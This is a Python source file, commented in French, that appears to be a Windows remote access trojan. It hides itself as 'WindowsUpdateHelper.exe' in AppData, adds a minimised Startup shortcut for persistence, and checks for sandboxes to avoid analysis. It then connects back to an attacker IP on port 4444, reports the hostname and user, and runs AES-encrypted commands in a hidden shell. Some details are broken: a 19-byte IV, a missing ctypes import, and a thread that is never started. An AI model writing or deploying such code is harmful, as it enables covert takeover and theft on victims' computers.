import os
import sys
import base64
import socket
import subprocess
import time
import threading
import json
import ctypes
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# --- Configuration ---
AES_KEY = b'CeciEstUneCle16!'  # 16, 24 ou 32 octets
AES_IV = b'VoiciUnIVDe16Octets' # 16 octets
HOST = '192.168.1.10'  # IP de l'attaquant
PORT = 4444            # Port de l'attaquant

# Chemins pour la persistance
# Nom d'un fichier qui semble légitime
PROCESS_NAME = "WindowsUpdateHelper.exe"
# Dossier AppData (caché)
PERSIST_PATH = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', PROCESS_NAME)
# Dossier Startup (Démarrage) pour le raccourci
STARTUP_FOLDER = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
SHORTCUT_PATH = os.path.join(STARTUP_FOLDER, "WindowsUpdateHelper.lnk")

def is_sandbox():
    """Vérifie si l'on est dans une machine virtuelle."""
    try:
        kernel32 = ctypes.windll.kernel32
        c_ulong = ctypes.c_ulong
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", c_ulong),
                ("dwMemoryLoad", c_ulong),
                ("ullTotalPhys", c_ulonglong),
                ("ullAvailPhys", c_ulonglong),
                ("ullTotalPageFile", c_ulonglong),
                ("ullAvailPageFile", c_ulonglong),
                ("ullTotalVirtual", c_ulonglong),
                ("ullAvailVirtual", c_ulonglong),
                ("ullAvailExtendedVirtual", c_ulonglong),
            ]
        ram = MEMORYSTATUSEX()
        ram.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        kernel32.GlobalMemoryStatusEx(ctypes.byref(ram))
        if ram.ullTotalPhys < 4 * 1024 * 1024 * 1024: 
            return True
        if os.cpu_count() < 2:
            return True
        username = os.environ.get('USERNAME', '').lower()
        if 'sandbox' in username or 'virus' in username or 'malware' in username:
            return True
        return False
    except Exception:
        return False

def create_shortcut(target, shortcut_path):
    """Crée un raccourci .lnk via les interfaces Windows COM."""
    try:
        import win32com.client
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = target
        shortcut.WorkingDirectory = os.path.dirname(target)
        # Argument pour lancer en mode minimisé (invisible)
        shortcut.WindowStyle = 7 
        shortcut.save()
        return True
    except ImportError:
        # Si pywin32 n'est pas installé, on essaie une méthode manuelle plus complexe
        # Mais pour ce script, on suppose que pywin32 est disponible ou on échoue silencieusement
        return False
    except Exception:
        return False

def establish_persistence_stealth():
    """Copie le fichier et crée un raccourci dans le dossier Startup."""
    if is_sandbox():
        return 

    # 1. Copie du fichier s'il n'est pas déjà au bon endroit
    current_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
    
    if os.path.exists(PERSIST_PATH):
        if current_path != PERSIST_PATH:
            try:
                subprocess.Popen(f'copy /Y "{current_path}" "{PERSIST_PATH}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except: pass
    else:
        try:
            if not os.path.exists(os.path.dirname(PERSIST_PATH)):
                os.makedirs(os.path.dirname(PERSIST_PATH))
            import shutil
            shutil.copyfile(current_path, PERSIST_PATH)
        except Exception:
            pass

    # 2. Création du raccourci dans le dossier Startup
    # On utilise le chemin copié (PERSIST_PATH) comme cible
    if not os.path.exists(SHORTCUT_PATH):
        try:
            # Tentative via win32com (nécessite 'pip install pywin32')
            # Si cela échoue, le script continuera sans persistance mais ne plantera pas
            if create_shortcut(PERSIST_PATH, SHORTCUT_PATH):
                # Si on a réussi à créer le raccourci depuis l'exe temporaire, on lance la vraie copie et on quitte
                if current_path != PERSIST_PATH:
                    subprocess.Popen(PERSIST_PATH, shell=True)
                    sys.exit(0)
        except Exception:
            pass

def aes_encrypt(data):
    try:
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
        return base64.b64encode(ct_bytes).decode('utf-8')
    except Exception:
        return None

def aes_decrypt(encoded_data):
    try:
        ct = base64.b64decode(encoded_data)
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')
    except Exception:
        return None

def run_cmd(command):
    try:
        if command.lower().startswith('cd '):
            new_dir = command[3:].strip()
            os.chdir(new_dir)
            return os.getcwd() + '>'
        else:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            result = subprocess.Popen(
                command, 
                shell=True, 
                stdin=subprocess.PIPE, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                text=True,
                startupinfo=startupinfo
            )
            output, error = result.communicate()
            return output + error
    except Exception as e:
        return f"Error: {e}\n"

def handle_connection(s):
    try:
        init_info = {
            "hostname": os.environ.get('COMPUTERNAME', 'Unknown'),
            "username": os.environ.get('USERNAME', 'Unknown'),
            "cwd": os.getcwd()
        }
        s.send(aes_encrypt(json.dumps(init_info)).encode('utf-8'))

        while True:
            s.settimeout(60.0) 
            try:
                encrypted_cmd = s.recv(4096).decode('utf-8')
                if not encrypted_cmd:
                    break
            except socket.timeout:
                try:
                    s.send(aes_encrypt("PING").encode('utf-8'))
                except:
                    break
                continue

            command = aes_decrypt(encrypted_cmd)
            if command is None:
                continue
            
            if command.lower() == 'exit':
                s.close()
                sys.exit(0)
            
            if command == "PING":
                continue
            
            output = run_cmd(command)
            encrypted_output = aes_encrypt(output)
            
            if encrypted_output:
                s.send(encrypted_output.encode('utf-8'))

    except Exception:
        pass
    finally:
        try:
            s.close()
        except:
            pass

def main_loop():
    # Appel de la persistance furtive
    establish_persistence_stealth()
    
    retry_count = 0
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            s.connect((HOST, PORT))
            
            retry_count = 0
            handle_connection(s)
            
        except Exception:
            retry_count += 1
            wait_time = min((retry_count * 2), 60)
            time.sleep(wait_time)

if __name__ == "__main__":
    main_thread = threading.Thread(target=main_loop, daemon=True)
    main_thread.start